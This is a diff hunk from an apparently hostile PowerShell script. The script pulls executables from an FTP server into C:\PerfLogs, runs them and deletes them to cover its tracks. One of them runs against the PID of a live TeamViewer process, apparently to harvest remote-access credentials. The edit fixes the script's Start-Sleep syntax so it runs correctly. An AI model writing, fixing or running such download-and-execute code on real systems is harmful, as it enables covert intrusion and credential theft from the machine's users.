@@ -24,7 +24,7 @@ $webclient = New-Object "System.Net.WebClient"
 $webclient.Credentials = New-Object System.Net.NetworkCredential($ftpUser,$ftpPass)  
 $webclient.BaseAddress = $ftpPath
 $webClient.DownloadFile("e.exe", $localPath+"e.exe")
-Start-Sleep –s 3
+Start-Sleep -s 3
 & C:\PerfLogs\e.exe | Out-File -Append $file
 rm C:\PerfLogs\e.exe
 
@@ -34,7 +34,7 @@ if ($tmp -match "TeamViewer.exe")
 	(tasklist | Where-Object{$_ -match "TeamViewer.exe"})  -match $parttern
 	$id = $matches[0]
 	$webClient.DownloadFile("rr.exe", $localPath+"rr.exe")
-	Start-Sleep –s 3
+	Start-Sleep -s 3
 	& C:\PerfLogs\rr.exe $id | Out-File -Append $file
 	rm C:\PerfLogs\rr.exe
 }
